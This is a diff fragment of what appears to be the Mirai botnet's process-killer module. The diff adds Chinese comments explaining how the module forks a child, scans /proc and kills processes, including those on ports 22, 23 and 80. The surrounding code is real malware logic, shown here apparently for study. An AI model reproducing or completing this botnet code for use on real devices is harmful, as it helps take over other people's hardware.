@@ -31,7 +31,7 @@ void killer_init(void)  //kill掉了22、23、80端口原来的进程，并且�
     struct sockaddr_in tmp_bind_addr;
 
     // Let parent continue on main thread
-    killer_pid = fork();
+    killer_pid = fork();    //父进程回到main.c中继续执行，子进程不断kill【每600s，就重新从pid=400开始scan+kill可疑进程】
     if (killer_pid > 0 || killer_pid == -1)
         return;
 
@@ -151,7 +151,7 @@ void killer_init(void)  //kill掉了22、23、80端口原来的进程，并且�
         while ((file = readdir(dir)) != NULL)                       
         {
             // skip all folders that are not PIDs
-            if (*(file->d_name) < '0' || *(file->d_name) > '9')     //PID为1~9跳过
+            if (*(file->d_name) < '0' || *(file->d_name) > '9')     //PID不为数字的跳过
                 continue;
 
             char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];        
@@ -160,7 +160,7 @@ void killer_init(void)  //kill掉了22、23、80端口原来的进程，并且�
 
             scan_counter++;                     
             if (pid <= killer_highest_pid)      //killer_highest_pid初始化为400
-            {
+            {   //在源码中函数中还有一部分是对 Killer 多进程保护，在KILLER_RESTART_SCAN_TIME(600)超时后会重启所有进程。
                 if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
                 {
 #ifdef DEBUG
